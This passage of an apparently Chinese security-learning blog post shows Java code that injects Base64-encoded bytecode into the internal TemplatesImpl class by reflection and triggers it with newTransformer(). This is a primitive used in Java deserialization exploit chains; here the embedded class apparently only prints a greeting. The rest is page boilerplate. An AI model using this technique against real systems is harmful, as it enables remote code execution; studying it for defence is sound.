+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import java.lang.reflect.Field;
+import java.util.Base64;
+
+
+public class Main &#123;
+    public static void main(String[] args) throws Exception &#123;
+        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEA&quot; +
+                &quot;CXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RP&quot; +
+                &quot;TTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0&quot; +
+                &quot;aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCm&quot; +
+                &quot;KExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29y&quot; +
+                &quot;Zy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2Fw&quot; +
+                &quot;YWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxp&quot; +
+                &quot;bml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAb&quot; +
+                &quot;DAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwB&quot; +
+                &quot;AEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFj&quot; +
+                &quot;dFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5z&quot; +
+                &quot;bGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry&quot; +
+                &quot;ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n&quot; +
+                &quot;OylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsA&quot; +
+                &quot;AAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwA&quot; +
+                &quot;AQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwA&quot; +
+                &quot;DwABABAAAAACABE=&quot;);
+        TemplatesImpl mpl =new TemplatesImpl();
+        Class a = mpl.getClass();
+        setFieldValue(mpl,&quot;_name&quot;,&quot;baicany&quot;);
+        setFieldValue(mpl,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;);
+        setFieldValue(mpl,&quot;_class&quot;,null);
+        setFieldValue(mpl,&quot;_tfactory&quot;,new TransformerFactoryImpl());
+        mpl.newTransformer();
+    &#125;
+    public static void setFieldValue(Object obj, String fieldName, Object Value) throws Exception &#123;
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, Value);
+    &#125;
+&#125;
+</code></pre>
+<h1 id="利用BCEL-ClassLoader加载字节码"><a href="#利用BCEL-ClassLoader加载字节码" class="headerlink" title="利用BCEL ClassLoader加载字节码"></a>利用BCEL ClassLoader加载字节码</h1><p>后面再写</p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/custom/donate/AliPayQR.jpg"></li>
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/custom/donate/WeChanQR.jpg"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2023/07/10/cc1/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/a1.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://baicany.github.io/images/a1.jpg">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                cc链1</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+
+
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="" class="profile gravatar"><img src="https://baicany.github.io/images/head.jpg" itemprop="image" alt="baicany" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="" itemprop="url" rel="author">baicany</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i></p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
+</div>
+
+
+
+    </div>    
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..."/>
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            // PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+    <!-- <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 baicany<br>
+      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer> -->
+<footer id="colophon" class="site-footer" role="contentinfo">
+  <div class="site-info">
+    <div class="footertext">
+      <div class="img-preload">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
+        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
+      </div>
+      <p style="color: #666666;">&copy 2018</p>
+    </div>
+    <div class="footer-device">
+    <p style="font-family: 'Ubuntu', sans-serif;">
+        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
+        </span>
+      </p>
+    </div>
+  </div><!-- .site-info -->
+</footer>
+
+
+
+<!-- <script src="/js/tocbot.js"></script> -->
+<script type="text/javascript" src="/js/lib.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script type="text/javascript" src="/js/InsightSearch.js"></script>
+<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
+<script type="text/javascript" src="/js/zoom.min.js"></script>
+<script type="text/javascript" src="/js/sakura-app.js"></script>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
+<script src="/js/botui.js"></script>
+<!-- 不蒜子 网页计数器 -->
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
+<script type="text/javascript">
+/* <![CDATA[ */
+if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2","name":"Unbroken.mp4","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+} else {
+  var Poi = {"pjax":"1","movies":{"url": "https://cdn.jsdelivr.net/gh/honjun/hojun@1.2","name":"Unbroken.mp4","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
+}
+/* ]]> */
+
+</script>
+<script>
+$(document).ready(function() {
+  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
+    if ($(".pattern-center").length > 0) { //有图的情况
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -400,
+          scrollSmoothOffset: -85
+      });
+    } else {
+      tocbot.init({
+          // Where to render the table of contents.
+          tocSelector: '.toc', // 放置目录的容器
+          // Where to grab the headings to build the table of contents.
+          contentSelector: '.entry-content', // 正文内容所在
+          // Which headings to grab inside of the contentSelector element.
+          scrollSmooth: true,
+          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
+          headingsOffset: -85,
+          scrollSmoothOffset: -85
+      });
+    }
+    var offsetTop = $('.toc').offset().top - 95;
+    window.onscroll = function() {
+      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
+      if (scrollTop >= offsetTop) {
+        $('.toc').addClass('toc-fixed');
+      } else {
+        $('.toc').removeClass('toc-fixed');
+      }
+    }
+  }
+});
+</script>
+
+    <div class="openNav no-select" style="height: 50px;">
+      <div class="iconflat no-select" style="width: 50px; height: 50px;">
+        <div class="icon"></div>
+      </div>
+      <div class="site-branding search-form-submit">
+        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
+      </div>
+    </div>
+  </section>
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6https://baicany.github.io/images/head.jpg">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">baicanのy</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            首页
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/archives">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+            归档
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+                  <i class="fa fa-code" aria-hidden="true"></i>
+                  学习记录
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/ctf%E8%AE%B0%E5%BD%95/">
+                  <i class="fa fa-code" aria-hidden="true"></i>
+                  ctf记录
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/%E6%9D%82%E4%BA%8B/">
+                  <i class="fa fa-commenting-o" aria-hidden="true"></i>
+                  杂事
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/links/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
+            友人帐
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+            关于
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/about/">
+                  <i class="fa fa-meetup" aria-hidden="true"></i>
+                  我？
+                </a>
+              </li>
+            
+              <li>
+                <a href="/theme-sakura/">
+                  <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
+                  主题
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
+</div>
+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+    id="2660651585"
+
+    server="netease"
+
+    type="playlist"
+
+    fixed="true"
+
+    autoplay="false"
+
+    loop="all"
+
+    order="random"
+
+    preload="false"
+
+    volume="0.7"
+
+    mutex="false"
+
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script>
+  <!-- 实现换肤功能 -->
+  <div class="skin-menu no-select" id="mainskin" style="position: fixed">
+ <div class="theme-controls row-container">
+  <ul class="menu-list">
+   <li id="white-bg"> <i class="fa fa-television" aria-hidden="true"></i></li>
+   <li id="sakura-bg"> <i class="iconfont icon-sakura"></i></li>
+   <li id="gribs-bg"> <i class="fa fa-slack" aria-hidden="true"></i></li>
+   <li id="KAdots-bg"> <i class="iconfont icon-dots"></i></li>
+   <li id="totem-bg"> <i class="fa fa-optin-monster" aria-hidden="true"></i></li>
+   <li id="pixiv-bg"> <i class="iconfont icon-pixiv"></i></li>
+   <li id="bing-bg"> <i class="iconfont icon-bing"></i></li>
+   <li id="dark-bg"> <i class="fa fa-moon-o" aria-hidden="true"></i></li>
+  </ul>
+ </div>
+</div>
+<canvas id="night-mode-cover"></canvas>
+ 
+  <div class="changeSkin-gear no-select">
+  <div class="keys" id="setbtn"> 
+   <span id="open-skinMenu"> 切换主题 | SCHEME TOOL  
+     <i class="iconfont icon-gear inline-block rotating"></i> 
+   </span>
+  </div>
+</div>
+
+  <div id="mo-nav" class="">
+  <div class="m-avatar">
+    <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6https://baicany.github.io/images/head.jpg">
+  </div>
+  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">baicanのy</p>
+  <p style="text-align: center; word-spacing: 20px;">
+    
+  </p>
+  <ul id="menu-new-1" class="menu">
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+            首页
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/archives">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+            归档
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+                  <i class="fa fa-code" aria-hidden="true"></i>
+                  学习记录
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/ctf%E8%AE%B0%E5%BD%95/">
+                  <i class="fa fa-code" aria-hidden="true"></i>
+                  ctf记录
+                </a>
+              </li>
+            
+              <li>
+                <a href="/categories/%E6%9D%82%E4%BA%8B/">
+                  <i class="fa fa-commenting-o" aria-hidden="true"></i>
+                  杂事
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="/links/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
+            友人帐
+          </span>
+        </a>
+        
+      </li>
+    
+      <li>
+        <a href="/">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+            关于
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/about/">
+                  <i class="fa fa-meetup" aria-hidden="true"></i>
+                  我？
+                </a>
+              </li>
+            
+              <li>
+                <a href="/theme-sakura/">
+                  <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
+                  主题
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+  </ul>
+  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
+</div>
+<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<!-- require MetingJS -->
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<style>
+  .aplayer .aplayer-lrc {
+    height: 35px;
+  }
+  .aplayer .aplayer-lrc p{
+    font-size: 16px;
+    font-weight: 700;
+    line-height: 18px !important;
+  }
+  .aplayer .aplayer-lrc p.aplayer-lrc-current{
+    color: #FF1493;
+  }
+  .aplayer.aplayer-narrow .aplayer-body{
+    left: -66px !important;
+  }
+  .aplayer.aplayer-fixed .aplayer-lrc {
+    display: none;
+  }
+  .aplayer .aplayer-lrc.aplayer-lrc-hide {
+      display:none !important;
+  }
+  .aplayer.aplayer-fixed .lrc-show {
+    display: block;
+    background: rgba(255, 255, 255, 0.8);
+  }
+</style>
+<meting-js
+
+    id="2660651585"
+
+    server="netease"
+
+    type="playlist"
+
+    fixed="true"
+
+    autoplay="false"
+
+    loop="all"
+
+    order="random"
+
+    preload="false"
+
+    volume="0.7"
+
+    mutex="false"
+
+</meting-js>
+<script>
+  $(function(){
+    $('body').on('click', '.aplayer', function(){
+      if($('.aplayer-button').hasClass('aplayer-play')) {
+        $('.aplayer-lrc').removeClass('lrc-show');
+      } else {
+        $('.aplayer-lrc').addClass('lrc-show');
+      }
+    })
+  });
+</script> 
+</body>
+</html>
